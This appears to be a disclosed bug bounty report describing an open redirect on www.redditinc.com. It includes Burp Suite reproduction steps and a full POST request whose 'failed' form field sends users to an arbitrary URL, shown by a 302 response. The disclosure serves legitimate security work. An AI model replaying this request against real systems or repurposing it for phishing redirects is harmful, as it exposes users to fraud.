# Open Redirect through POST Request in www.redditinc.com

## Report Details
- **Report ID**: 1310230
- **URL**: https://hackerone.com/reports/1310230
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-08-18T16:48:06.007Z
- **Disclosed**: 2022-07-08T19:02:01.542Z

## Reporter
- **Username**: kratul
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: reddit

## Vulnerability Information
## Summary:
Open redirection vulnerabilities arise when an application incorporates user-controllable data into the target of a redirection in an unsafe way. An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application. The ability to use an authentic application URL, targeting the correct domain and with a valid SSL certificate (if SSL is used), lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.

## Steps To Reproduce:
Requests are sent from Burp Suite Community Edition

  1. Intercept Request of www.redditinc.com
  2. Send it to Repeater.
  3. Paste the HTTP Request given.
  4. Send.
  5. Copy link from the Show Response in Browser option.
  6. Paste it in Burp Browser and Run.

##Reference/Supporting Material:
[https://hackerone.com/reports/242243](https://hackerone.com/reports/242243)

## POC Video is attached



## HTTP Request:
```
POST /ama HTTP/2
Host: www.redditinc.com
Content-Type: multipart/form-data; boundary=----------YWJkMTQzNDcw
Cookie: OptanonAlertBoxClosed=2021-08-18T14:18:57.720Z;OptanonConsent=isIABGlobal=false&datestamp=Wed+Aug+18+2021+19%3A48%3A59+GMT%2B0530+(India+Standard+Time)&version=6.13.0&hosts=&consentId=bca87c2e-056e-4636-b582-be4622de55db&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Content-Length: 1509
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36

------------YWJkMTQzNDcw
Content-Disposition: form-data; name="action"

zendesk/default/submit
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="agreement"

yes
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="description"

555
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="email"

sample@email.tst
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="email_confirm"

sample@email.tst
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="failed"

http://google.com
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="name"

ghovjnjv
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="organization"

PENTESTING
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="participants"

ghovjnjv
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="redirect"

74bcbfb4f9c047fb4e467dd203ca3b30f2b31216551ab9db2bf44911c029d506thank-you/ama-form-step-1
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="subject"

AMA Request
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="success"

thank-you/ama-form-step-1
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="ticket_form_id"

360000307211
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="timeframe"

next-week
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="timezone"

(GMT-05:00) Eastern Time (US & Canada)
------------YWJkMTQzNDcw--

```



## HTTP Response:
```
HTTP/2 302 Found
Server: nginx
Content-Type: text/html; charset=UTF-8
Permissions-Policy: interest-cohort=()
X-Robots-Tag: none
X-Powered-By: Craft CMS
Location: http://google.com
Cache-Control: private
Accept-Ranges: bytes
Date: Wed, 18 Aug 2021 15:30:48 GMT
Via: 1.1 varnish
Strict-Transport-Security: max-age=31536000; includeSubdomains
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block
Content-Length: 0
```

## Impact

A remote attacker can redirect users from your website to a specified URL. This problem may assist an attacker to conduct phishing attacks, trojan distribution, spammers.

## Attachments
- Open_Redirect_through_POST_Request.mp4
